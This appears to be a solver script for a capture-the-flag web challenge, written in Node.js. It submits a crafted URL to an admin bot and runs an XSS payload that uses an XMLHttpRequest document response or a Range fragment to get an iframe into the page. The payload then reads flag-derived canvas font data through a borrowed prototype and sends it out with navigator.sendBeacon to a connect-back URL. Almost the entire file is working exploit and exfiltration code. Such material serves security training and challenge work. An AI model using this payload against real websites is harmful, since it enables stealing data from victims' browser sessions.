import fastify from "fastify";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

// Solution 1
// ref. https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseXML
const xss = `
const xhr = new window.XMLHttpRequest();
xhr.open(
  "GET",
  "data:text/html,<iframe name=evil srcdoc=foobar></iframe>"
);
xhr.responseType = "document";
xhr.onload = () => {
  setTimeout(() => {
    const body = document.lastChild.lastChild;
    const iframe = xhr.responseXML.lastChild.lastChild.firstChild;
    body.appendChild(iframe);

    const font = document.evil.HTMLCanvasElement.prototype.getContext.call(flag, "2d").font;
    navigator.sendBeacon("${CONNECTBACK_URL}", font);
  }, 1000);
};
xhr.send();
`.trim();

// // Solution 2
// // ref. https://developer.mozilla.org/en-US/docs/Web/API/Range/createContextualFragment
// const xss = `
// const body = document.lastChild.lastChild;
// const fragment = new Range().createContextualFragment("<iframe name=evil srcdoc=foobar></iframe>");
// const iframe = fragment.lastChild;
// body.appendChild(iframe);
//
// const font = document.evil.HTMLCanvasElement.prototype.getContext.call(flag, "2d").font;
// navigator.sendBeacon("${CONNECTBACK_URL}", font);
// `.trim();

const url = `http://web:3000?${new URLSearchParams({ xss })}`;

app.post("/", async (req, reply) => {
  // You got a flag!
  console.log(req.body);
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) assert.fail(err.toString());

  await sleep(3_000);
  await reportUrl(url);

  await sleep(3_000);
  assert.fail("Failed");
});
